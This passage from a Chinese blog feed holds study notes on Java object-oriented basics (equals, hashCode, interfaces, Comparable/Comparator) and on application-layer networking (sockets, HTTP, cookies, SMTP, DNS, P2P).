<p>静态内部类不可以访问外部类的私有属性和方法，可以访问外部类私有静态成员:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hero</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hp;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BattleWin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"战斗胜利！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BreakTower</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hp = <span class="number">50000</span>;</span><br><span class="line">        <span class="keyword">if</span> (hp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            Hero.BattleWin();</span><br><span class="line">            <span class="comment">// 静态内部类无法访问外部类实例属性。方法</span></span><br><span class="line">            System.out.println(name + <span class="string">"胜利！"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="类之间的关系"><a href="#类之间的关系" class="headerlink" title="类之间的关系"></a>类之间的关系</h1><p>最常见的关系有：</p>
<ol>
<li>依赖(deependence)。如果一个类的方法操纵另一个类的对象，我们就说一个类依赖于另一个类。应尽可能减少将相互依赖的类，如果类A不依赖于B，那么B的任何改变对A没有影响。这称为<code>让类之间的耦合度最小</code></li>
<li>聚合(aggregation)。意味着一个类的对象包含另一个类的对象。如订单类对象包含商品类对象</li>
<li>继承(inheritance)。继承是对象的一种扩展，子类拥有父类的全部方法和属性</li>
</ol>
<h1 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h1><p>Object类时Java中所有类的始祖，Java中每个类都是由它扩展而来的。如果没有明确指出超类，Object类就是这个类的超类。</p>
<p>可以使用Object类型的变量引用任何类型的变量：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Employee(<span class="string">"David"</span>, <span class="number">4500</span>);</span><br></pre></td></tr></table></figure></p>
<p>不过，Object类型变量只是各种值的持有者，想要对其中的内容进行操作需要进行类型转换：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee e = (Employee) obj;</span><br></pre></td></tr></table></figure></p>
<p>所有数组，不管是基本类型数组还是对象数组，都扩展了Object类：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj;</span><br><span class="line">Emplpyee[] staff = <span class="keyword">new</span> Employee[<span class="number">3</span>];</span><br><span class="line">obj = staff; <span class="comment">// OK</span></span><br><span class="line">obj = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>]; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure></p>
<h2 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h2><p>Object类中的equals方法用于检测一个对象是否等于另一个对象。两个对象是否相等是通过所属类及实例域状态决定的。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检查两个类是否引用同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == otherObject) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果形参为null返回false</span></span><br><span class="line">        <span class="keyword">if</span> (otherObject == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果两个类所属类不相等，返回false</span></span><br><span class="line">        <span class="keyword">if</span> (getClass() != otherObject.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 想在我们知道otherObject是一个Employee类</span></span><br><span class="line">        Employee other = (Employee) otherObject;</span><br><span class="line">        <span class="comment">// 检查实例域是否相等</span></span><br><span class="line">        <span class="keyword">return</span> Objects.equals(<span class="keyword">this</span>.name, other.name)</span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.salary == other.salary</span><br><span class="line">        <span class="comment">// 可以使用this.name.equals(other.name)，为了防止this.name为null最好使用Objects.equals()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在子类中定义equals方法时，首先调用超类的equals。如果检测失败，对象就不可能相等。如果超类中的域相等，就需要比较子类中的域：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// super.equals检测otherObject与超类是否相等</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.equals(otherObject)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        Manager other = (Manager) otherObject;</span><br><span class="line">        <span class="comment">// 比较子类中的域</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.bonus == other.bonus;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面给出编写完美equals方法的步骤：</p>
<ol>
<li>显示参数命名为otherObject，稍后将它转化成一个叫做other的变量</li>
<li><p>检测this与otherObject是否引用同一个对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> == otherObject) <span class="keyword">return</span> <span class="keyword">true</span>；</span><br></pre></td></tr></table></figure>
</li>
<li><p>检测otherObject是否为null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherObject == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>比较this与otherObject是否属于同一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (getClass() != otherObject.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将otherObject转化为相应类型变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassName other = (ClassName) otherObject</span><br></pre></td></tr></table></figure>
</li>
<li><p>比较实例域，用<code>==</code>比较基本类型域，<code>Objects.equals()</code>比较对象域(对于数组类型的域使用<code>Arrays.equals</code>方法判断是否相等)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> field1 == other.field1</span><br><span class="line">    &amp;&amp; Objects.equals(<span class="keyword">this</span>.field2, other.field2)</span><br><span class="line">    &amp;&amp; Arrays.equals(<span class="keyword">this</span>.field3, other.field3)</span><br><span class="line">    &amp;&amp; ...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h2><p>Object中的hashCode返回由对象导出的整型值。<em>在定义类时如果没有覆盖hashCode方法，会根据对象的内存地址产生一个散列码。如果定义了hashCode，则由对象内容导出一个散列码</em>。</p>
<p>获得一个对象的散列码可以用<code>Objects.hashCode</code>方法，获得基本类型的散列码可以打包后调用hashCode方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Double.hashCode(<span class="number">10</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h2><p>Object类的toString方法返回表示对象值的字符串。一般表示形式为<code>类名[域值]</code>:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.awt.Point[x=<span class="number">10</span>,y=<span class="number">10</span>]</span><br></pre></td></tr></table></figure></p>
<p>当对象与字符串通过<code>+</code>操作符连接起来，Java编译器就会自动地调用toString方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Point p = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">String message = <span class="string">"当前位置为"</span> + p;</span><br></pre></td></tr></table></figure></p>
<p>如果x是一个对象，调用System.out.println(x)，println方法会自动调用x.toString()。<br>Object类定义了toString方法用来打印对象所属的类名和散列码：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(System.out) <span class="comment">// 输入java.io.PrintStream@2f6684</span></span><br></pre></td></tr></table></figure></p>
<p>这是因为PrintStream类没有覆盖toString方法。数组继承了这一特性，打印数组中的元素使用<code>Arrays.toString</code>方法</p>
<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口（interface）主要用来描述类具有什么功能，而不给出每个功能的具体实现。这种做法有利于实现类的扩展，因为Java不支持多继承。接口还在有利于多态，因为虽然接口无法构造对象，却能声明接口的变量，且这个变量能引用所有实现了该接口的类对象。</p>
<h2 id="构造一个接口"><a href="#构造一个接口" class="headerlink" title="构造一个接口"></a>构造一个接口</h2><p>构造接口与构造类相似，只是将<code>class</code>改为<code>interface</code>，此外，还可以将接口定义为泛型，接受类型参数，这样会提高接口的可用性：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object other)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T other)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接口内声明了一些方法，绝不应含有实例域，而实现方法和提供实例域的任务都由实现接口的那个类完成。接口中的方法自动是<code>public</code>，在类中定义这些方法时也应使用<code>public</code></p>
<h2 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h2><p>为了让类实现接口，有两个步骤：</p>
<ol>
<li>让类声明为实现给定的接口</li>
<li>对接口中所有方法进行定义</li>
</ol>
<p>将类声明为实现某些接口，使用关键字<code>implement</code>:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee other = (Employee) otherObject;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span>&lt;<span class="title">Employee</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee other)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接口也可以继承，子接口有父接口中声明的方法和常量：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">time</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">runable</span> <span class="keyword">extends</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">speed</span><span class="params">()</span></span>; <span class="comment">// 实现runable的类必须实现time()和speed()方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="接口的默认方法"><a href="#接口的默认方法" class="headerlink" title="接口的默认方法"></a>接口的默认方法</h2><p>用<code>default</code>关键字可以在接口中声明方法时进行简单的定义，但不能涉及实例域因为接口没有实例：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MouseListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">mouseClcked</span><span class="params">(MouseEvent event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"鼠标点击"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如此一来，实现这个接口的类可以不覆盖这个默认方法而具有默认方法提供的功能。</p>
<h3 id="默认方法冲突"><a href="#默认方法冲突" class="headerlink" title="默认方法冲突"></a>默认方法冲突</h3><ol>
<li>如果接口的默认方法名与超类的方法名冲突了，遵循<code>超类优先</code>原则，即接口提供的默认方法会被忽略。</li>
<li><p>如果多个接口提供的默认方法名冲突，由类决定使用哪个接口的默认方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person和Named都有默认方法getName()</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">implement</span> <span class="title">Person</span>, <span class="title">Named</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Person.<span class="keyword">super</span>.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果多个接口都没有提供默认方法，那么要么在类中覆盖这个方法，要么这是一个抽象类，把这个方法定义为抽象方法由子类去实现  </p>
</li>
</ol>
<h2 id="接口Comparable与Comparator"><a href="#接口Comparable与Comparator" class="headerlink" title="接口Comparable与Comparator"></a>接口Comparable与Comparator</h2><h3 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h3><p>Comparable接口是函数式接口，此接口只有一个方法compare，比较此对象与指定对象的顺序，如果该对象小于、等于或大于指定对象，则分别返回负整数、零或正整数：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt; </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T o)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一个类若实现了Comparable接口，意味着这个类支持排序。实现了Comparable接口的类的对象的数组或列表可以使用<code>Arrays.sort</code>或<code>Collections.sort</code>进行自动排序。</p>
<h3 id="Comparator接口"><a href="#Comparator接口" class="headerlink" title="Comparator接口"></a>Comparator接口</h3><p>实现了Comparator接口的类是一个比较器。对某些没有实现Comparable接口的类进行排序，只要提供一个比较器告诉排序方法按照什么规则进行排序就可以了，该接口的定义为：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparator</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>实现Comparator接口的类一定要实现compare方法，而不一定要实现equals方法。<br>int compare(T o1, T o2) 是“比较o1和o2的大小”。返回“负数”，意味着“o1比o2小”；返回“零”，意味着“o1等于o2”；返回“正数”，意味着“o1大于o2”。</p>
<h3 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h3><p>Comparable是排序接口，若一个类实现了Comparable接口，就意味着“该类支持排序”。而Comparator是比较器，我们若需要控制某个类的次序，可以建立一个“该类的比较器”来进行排序。</p>
<p>Comparable相当于“内部比较器”，而Comparator相当于“外部比较器”。</p>
<p>两种方法各有优劣， 用Comparable 简单， 只要实现Comparable 接口的对象直接就成为一个可以比较的对象，但是需要修改源代码。 用Comparator 的好处是不需要修改源代码， 而是另外实现一个比较器， 当某个自定义的对象需要作比较的时候，把比较器和对象一起传递过去就可以比大小了， 并且在Comparator 里面用户可以自己实现复杂的可以通用的逻辑，使其可以匹配一些比较简单的对象，那样就可以节省很多重复劳动了。<br>（二者的使用实例见：<a href="https://www.cnblogs.com/xujian2014/p/5215082.html" target="_blank" rel="noopener">参考博客</a>）</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之应用层</title>
    <url>/2018/06/07/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<h1 id="网络应用结构"><a href="#网络应用结构" class="headerlink" title="网络应用结构"></a>网络应用结构</h1><ul>
<li>客户机/服务器结构（C/S）</li>
<li>点对点结构（P2P）</li>
<li>混合结构（综合 C/S 与 P2P）</li>
</ul>
<p>应用层是程序员最常接触的层次，应当非常熟悉。</p>
<h2 id="端系统间的进程通信"><a href="#端系统间的进程通信" class="headerlink" title="端系统间的进程通信"></a>端系统间的进程通信</h2><p>一个进程可以理解为运行在端系统中的的一个程序。当进程运行在相同的端系统上时，它们使用进程间通信机制相互通信。而在不同的端系统上，通过跨越计算机网络交换<code>报文</code>实现进程间的通信。</p>
<p>多数应用程序由通信进程对组成，每对中的两个进程互相发送报文，从一个进程向另一个进程发送报文就必须经过下面的计算机网络。进程通过一个被称为<code>套接字</code>的软件接口向网络发送报文和接受报文。<code>套接字</code>类似于一栋屋子的门，无论是要进入屋子还是离开屋子，都要进过门。<code>套接字</code>是应用层与运输层的接口。在运输层，开发者对于<code>套接字</code>几乎没有控制权，只能</p>
<ol>
<li>选择运输层协议</li>
<li>设定几个参数，如最大缓存、最大报文段长度等</li>
</ol>
<h3 id="套接字（Socket）"><a href="#套接字（Socket）" class="headerlink" title="套接字（Socket）"></a>套接字（Socket）</h3><p>套接字是一种应用编程接口（API），不同主机的应用进程间通信的抽象机制。应用进程通过套接字将数据控制权转移给操作系统，以实现信息从应用层到传输层的转换。</p>
<h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>每个应用进程都可能对应一个或多个套接字。为了区分不同套接字，操作系统给每个套接字绑定一个 16 位整数（0——65535），称之为<strong>端口号（port）</strong>。</p>
<p>对外标识通信端点：IP Address + port。</p>
<h3 id="进程寻址"><a href="#进程寻址" class="headerlink" title="进程寻址"></a>进程寻址</h3><p>为了与另一个端系统通信，必须知道：</p>
<ol>
<li>另一端系统的地址</li>
<li>定义在目的端系统中的接收进程的标志符</li>
</ol>
<p>端系统地址由<code>IP地址</code>确定，而接收进程标志符由<code>端口</code>确定。</p>
<p>操作系统对内标识套接字：<strong>套接字描述符（socket descriptor）</strong>，非常类似于文件的抽象机制。每个进程有一个套接字描述符表，进程每创建一个套接字都会在表里增加一个条目，每个条目对应一个套接字数据结构指针。</p>
<p><img src="https://i.loli.net/2019/12/21/LEHvFzdNowkq6Bc.png" alt="套接字描述符表"></p>
<p>地址族（family）：不同传输协议下主机的端点形式不同，用地址族区分不同的传输协议。</p>
<p>类型（service）：区分某一传输协议下的不同协议。</p>
<p><img src="https://i.loli.net/2019/12/21/4vTABxRFnmIgh9Q.png" alt="协议类型"></p>
<h2 id="几种常见的应用层协议"><a href="#几种常见的应用层协议" class="headerlink" title="几种常见的应用层协议"></a>几种常见的应用层协议</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP（超文本传输协议）是 Web 的核心。在 Web 应用中，客户与服务器之间是通过 HTTP 报文进行会话的。而HTTP协议定义了报文格式与交换方式。Web 服务器实现了 HTTP 的服务器端，用于存储 Web 对象，每个对象由 url 寻址。</p>
<p><img src="https://i.loli.net/2020/01/20/9MTnkYv5yfxOL1u.png" alt="HTTP请求格式"></p>
<p><img src="https://i.loli.net/2020/01/20/StgFZXMs5GIbwYc.png" alt="HTTP响应格式"></p>
<p>HTTP 使用<code>TCP</code>作为它的支撑运输协议，默认采用<code>带流水机制的持久性连接</code>。 一次完整的<code>请求——响应</code>流程是这样的：</p>
<ol>
<li>HTTP客户端首先发起一个与服务器的 TCP 连接，一旦连接建立，该客户端进程与服务器进程就可以通过套接字接口通信。</li>
<li>客户端向它的<code>套接字</code>接口发送 HTTP 请求报文。</li>
<li>服务器收到 HTTP 请求报文并生成相应的响应报文，通过服务器的<code>套接字</code>发送响应报文。</li>
<li>客户端从<code>套接字</code>接受响应报文。</li>
<li>所有报文传输结束，关闭 TCP 连接。</li>
</ol>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>HTTP 是无状态协议，不记录客户端的历史行为，换言之对服务器而言每个 HTTP 请求都是独立的，不和历史请求有任何关系。为了辨别用户身份，维持 session，cookie 应运而生，它是一小段储存在客户端且通常经过加密的数据。</p>
<p>Cookie 在 HTTP 协议中以头部行的形式传输，由服务器设置，被客户端（通常是浏览器）保存在本地。</p>
<p><img src="https://i.loli.net/2020/01/20/wvu6zqyA9rKFDib.png" alt="Cookie原理"></p>
<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>通过 SMTP（简单邮件传输协议）实现发送邮件。因特网电子邮件系统由 3 部分组成：</p>
<ul>
<li>用户代理。常见的邮件客户端如 Outlook 等都是用户代理，如果是通过 Web 端发送邮件，那么浏览器是用户代理。用户代理负责读写邮件、与邮件服务器交互</li>
<li>邮件服务器。通常由企业提供，如 QQ 邮箱的服务器<code>smtp.qq.com</code>，126 邮箱服务器<code>smtp.126.com</code></li>
<li>SMTP。负责在邮件服务器之间发送邮件</li>
</ul>
<p>一个典型的发送邮件的过程是：</p>
<ol>
<li>从发送方的用户代理开始，传输到发送方的邮件服务器</li>
<li>从发送方的邮件服务器发到接收方的邮件服务器，然后被分发到接收方的邮箱中</li>
<li>接收方通过用户代理从邮箱获取邮件</li>
</ol>
<p>SMTP 是因特网电子协议中的主要应用层协议，它用 TCP 提供可靠数据传输服务。</p>
<p>SMTP 规定邮件报文首部必须包含关键字<code>From:</code>与<code>To:</code>，可以包含关键字<code>Subject:</code>。</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>如果把客户向服务器发送报文比作打电话，那么服务器的IP地址是电话号码，域名是号码主人的姓名，而 DNS（Domain Name System 域名系统）就是电话簿，把姓名和电话号码联系起来。</p>
<p>DNS是：</p>
<ol>
<li>一个由分层的DNS服务器实现的分布式数据库</li>
<li>一个使主机能够查询分布式数据库的应用层协议</li>
</ol>
<p>DNS提供的服务有：</p>
<ul>
<li>域名解析服务</li>
<li>主机别名服务</li>
<li>邮件服务器别名服务</li>
<li>负载均衡。将一个域名与多个IP地址对应起来，当客户对域名发出一个DNS请求时，每次响应都循环<br>这些IP地址的次序。由于客户总是向排在最前面的IP地址发送HTTP请求，由此实现了负载均衡。</li>
</ul>
<p>获得一个域名的 IP 地址的过程如下：</p>
<ol>
<li>浏览器把域名发送到用户主机上的DNS客户端 </li>
<li>DNS 客户端向 DNS 服务器发送一个包含主机名的请求</li>
<li>DNS 服务器通过查询相应的域名——&gt; I 地址间的映射关系，生成一个响应报文并返回</li>
<li>DNS 客户端收到响应报文，把报文中的IP地址传给浏览器</li>
</ol>
<h4 id="实质"><a href="#实质" class="headerlink" title="实质"></a>实质</h4><p>多层命名服务器构成的<strong>分布式</strong>数据库。属于应用层协议，负责域名解析功能。  </p>
<h4 id="分层式层次式数据库"><a href="#分层式层次式数据库" class="headerlink" title="分层式层次式数据库"></a>分层式层次式数据库</h4><p>第一层：根域名服务器（root）</p>
<p>第二层：顶级域名服务器（top-level domain，TLD），负责 com，org，cn，jp 等</p>
<p>第三层：权威域名服务器（authoritative），负责组织域名解析，如 alibaba，baidu 等</p>
<p><img src="https://i.loli.net/2019/12/21/gXAveHhuimtyWl5.png" alt="分层结构"></p>
<p>举个例子：客户端访问 <a href="www.baidu.com">www.baidu.com</a>。</p>
<ol>
<li>向根域名服务器发送查询请求。根域名服务器返回 com 域名服务器地址。</li>
<li>向 com 域名服务器发送查询请求。com 域名服务器返回 baidu.com 域名服务器地址。</li>
<li>向 baidu.com 域名服务器发送查询请求。baidu.com 域名服务器返回 w<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 地址。</li>
</ol>
<p><strong>本地域名服务器：</strong> 不严格属于层级体系，每个 ISP 有一个本地域名服务器，是该 ISP 用户的默认域名解析服务器。作为代理将该 ISP 用户的查询转发给域名解析服务器系统。</p>
<h4 id="为什么不用采用集中式架构"><a href="#为什么不用采用集中式架构" class="headerlink" title="为什么不用采用集中式架构"></a>为什么不用采用集中式架构</h4><ul>
<li>单点失败问题</li>
<li>流量问题</li>
<li>距离问题</li>
<li>维护性问题</li>
</ul>
<p>不可伸缩！</p>
<h4 id="DNS-查询方式"><a href="#DNS-查询方式" class="headerlink" title="DNS 查询方式"></a>DNS 查询方式</h4><ul>
<li><p>迭代查询。用户的查询被转发到本地域名服务器上，本地域名服务器依次访问 3 层域名解析服务器系统。</p>
</li>
<li><p>递归查询。用户的查询被转发到本地域名服务器上，本地域名服务器访问根域名服务器，根域名服务器访问顶级域名服务器，顶级域名服务器访问权威域名服务器。最后的查询结果依次返回给上一层。</p>
</li>
</ul>
<h4 id="DNS-缓存与更新"><a href="#DNS-缓存与更新" class="headerlink" title="DNS 缓存与更新"></a>DNS 缓存与更新</h4><p>一段时间后，缓存条目会失效。本地域名服务器一般会缓存顶级域名服务器地址，所以根域名服务器较少被访问。</p>
<h4 id="DNS-记录与格式"><a href="#DNS-记录与格式" class="headerlink" title="DNS 记录与格式"></a>DNS 记录与格式</h4><p>DNS 记录又称资源记录（RR，Resource Record）。是一个四元组：<strong>（name，value，type，ttl）</strong>。</p>
<ul>
<li>type=A：name=主机域名，value=IP 地址。</li>
<li>type=NS：name=域（edu.cn、qiuyueqy.com），value=该域的权威域名解析服务器的主机域名。</li>
<li>type=CNAME：name=某真实域名的别名，value=真实域名。</li>
<li>type=MX：name=域（126.com，163.com）,value=与name对应的邮件服务器.</li>
</ul>
<h4 id="为什么在应用层实现"><a href="#为什么在应用层实现" class="headerlink" title="为什么在应用层实现"></a>为什么在应用层实现</h4><p>我们希望把复杂的东西尽量放在端系统实现。在应用层实现 DNS 协议有利于降低网络核心的复杂度。</p>
<h4 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h4><p>由上可知，为了获取一个DNS地址进行了很多次请求，这就影响了速度。为了加快响应速度，DNS服务器有缓存机制：在一个请求链中，当某DNS服务器接收到一个DNS回答，它能将该回答中的信息缓存到本地存储器中，类似于Web缓存器。在一段时间（默认为两天）后将缓存信息丢弃。</p>
<h4 id="DNS劫持与污染"><a href="#DNS劫持与污染" class="headerlink" title="DNS劫持与污染"></a>DNS劫持与污染</h4><p>DNS 污染是指服务器检测到用户访问特定的主机时，伪装成 DNS 服务器向用户返回错误IP地址。国内用户访问 youtube 等网站时就会遇到这种情况</p>
<p>DNS 劫持是通过劫持特定的DNS服务器，在 DNS 服务器里存放错误的缓存信息，这样 DNS 服务器就会向用户返回错误的 IP 地址</p>
<p>对于 DNS 劫持，可用采用更换默认 DNS 服务器的方式解决。而 DNS 污染只能通过修改 hosts 文件、VPN 等方式绕过服务器</p>
<h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>P2P（Peer to Peer）应用的几个特点：</p>
<ul>
<li>没有服务器</li>
<li>任意端系统之间直接互联</li>
<li>节点阶段性接入Intent</li>
<li>节点可能更换IP地址</li>
</ul>
